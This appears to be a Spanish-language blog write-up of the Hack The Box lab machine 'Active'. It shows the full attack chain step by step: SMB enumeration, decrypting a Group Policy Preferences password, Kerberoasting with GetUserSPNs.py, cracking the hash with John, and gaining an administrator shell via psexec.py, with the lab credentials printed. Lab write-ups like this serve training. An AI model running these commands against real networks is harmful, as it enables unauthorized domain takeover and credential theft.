---
layout: post
title: "Write Up Active"
subtitle: "Starting-Point"
category: Blog
tags: [Easy,Genin,Windows,HTB,Kerberoasting,gpp-decrypt,GetUserSPNs.py,SMB,Active-Directory,Kerberos,Network,Vulnerability-Assessment,Active-Directory,Outdated-Software,Security-Tools,Authentication,Impacket,Reconnaissance,Password-Cracking,Default-Credentials,Weak-Permissions,Anonymous_Guest-Access,OSCP,OSEP]
image:
  path: /assets/img/active/active.png
---

***
<!--more-->

1. this ordered seed list will be replaced by the toc
{:toc}

***

## Reconocimiento


### nmap

Utizando nmap comprobamos que puertos estan abiertos.


```bash
sudo nmap --open -p- -Pn -n -vvv --min-rate 5000 -sS 10.10.10.100 -oG allports
```

### Servicios y versiones


```bash
nmap -sCV -p53,88,135,139,389,445,464,593,636,3268,3269,5722,9389,47001,49152,49153,49154,49155,49157,49158,49165,49166,49168 10.10.10.100 -oN target -Pn
```


***

## Analisis de vulnerabilidades

Estando abierto los puertos 139 y 445 imediatamente lo que debemos hacer es tratar de explotar el smb,esto lo hacemos con crackmapexec, smbclient,smbmap entre otros.

![list](/assets/img/active/Kali-2022-09-16-23-10-48.png){:.lead width="800" height="100" loading="lazy"}

```bash
smbclient -L 10.10.10.100 -N
```

{:.note}
Listamos los shares.

Con crackmapexec vemos si el smb esta firmado ademas del dominio entre ota informacion.

```bash
crackmapexec smb 10.10.10.100
```

{:.note}
El doninio es `active.htb`,lo agrgamos al `/etc/hosts`.


Los siguiente es movernos por el recurso smb o crearnos una montura pero en este caso como vemos que hay muchos recursos pero sin credenciales solo tenemos acceso al share replication el cual podemos listar o movernos dentro de el con el parametro -R recursivamente para ver todo el contenido del mismo o con -r para movernos como directorio sea como sea en este caso lo que deberemos bucar es un archivo llamado groups.xml que contenie una credecial que deberemos crackear.

![list](/assets/img/active/Parrot-SO3-2022-08-18-22-31-30.png){:.lead width="800" height="100" loading="lazy"}

{:.note}
Como se puede observar tiene el dominio y el useraurio `active.htb\SVC_TGS` mas un hash .



Con la herramienta `gpp-decrypt` pdemos obtener la contraseña de la siguiente forma.

```bash
gpp-decrypt 'edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ'
```

{:.note}
La contraseña es `GPPstillStandingStrong2k18`.

***
## Explotacion

Con cracmapexec verificamos si las credeciales son validas ademas podemos listar de una ves a que shres tenemos accesos,tenemos acceso a NETLOGON, Replication, SYSVOL y Users .

El unico que tiene algo interesante es el de Users el cual moviendo atraves del recurso podremos encontrar la flag user.txt o tambien podriamos decargarla a nuestra maquina con el comando.

```bash
smbmap -H 10.10.10.100 -u "SVC_TGS" -p "GPPstillStandingStrong2k18" --download Users/SVC_TGS/Desktop/user.txt
```

{:.note}
Un cat a user.txt y se puede ver la contraseña.

![list](/assets/img/active/Parrot-SO3-2022-08-18-22-50-08.png){:.lead width="800" height="100" loading="lazy"}

***
## Escalacion de privilegios 

Exite varias herramentas que enumeran usauarios y grupos de smb y rcp, podemos usar `lookupsid.py` y `rcpclient` pero ene ste caso utilizaremos `rcpclient`.

![list](/assets/img/active/Parrot-SO3-2022-08-18-22-50-08.png){:.lead width="800" height="100" loading="lazy"}

{:.note}
Encontramos otros tres usuarior pero nada a destacar.



Por lo anterior tenemos el dominio + un usuario + una contraseña  podemos probar un ataque [Kerberosting]

[Kerberosting]: https://www.netwrix.com/cracking_kerberos_tgs_tickets_using_kerberoasting.html

```bash
GetUserSPNs.py 'active.htb/SVC_TGS:GPPstillStandingStrong2k18' -request
```
![list](/assets/img/active/Parrot-SO3-2022-08-18-23-02-30.png){:.lead width="800" height="100" loading="lazy"}


{:.note}
Debermos crackear el hash con `John The Ripper`.


```bash
john -w=/usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt hash
```


{:.note}
La contraseña es`Ticketmaster1968`.

Con cracmapexec verificamos si las credeciales son validas.

```bash
crackmapexec smb 10.10.10.100 -u "Administrator" -p "Ticketmaster1968"
```

![list](/assets/img/active/Kali-2022-09-16-23-36-01.png){:.lead width="800" height="100" loading="lazy"}

Con la herramienta `psexec.py` nos conectamos a la maquina victima con el siguiente comando.


```bash
psexec.py active.htb/Administrator:Ticketmaster1968@10.10.10.100 cmd.exe
```

Para este punto solo debemos buscar las flags aunque la de user.txt ya la pudimos ver antes.

![list](/assets/img/active/Kali-2022-09-16-23-41-01.png){:.lead width="800" height="100" loading="lazy"}


{:.note}
La flag esta en el ecritorio del usuario no privilegiado.

![list](/assets/img/active/Kali-2022-09-16-23-41-58.png){:.lead width="800" height="100" loading="lazy"}

{:.note}
La flag esta en el ecritorio del usuario priviligiado.

***
```bash
🎉 Felicitaciones ya has comprometido Active de Hack The Box. 🎉
```
{:.centered}

***
Back to [Certification OSCP](2023-07-10-Road-to-OSCP.md){:.heading.flip-title}
{:.read-more}

***
Back to [Certification OSEP](){:.heading.flip-title}
{:.read-more}
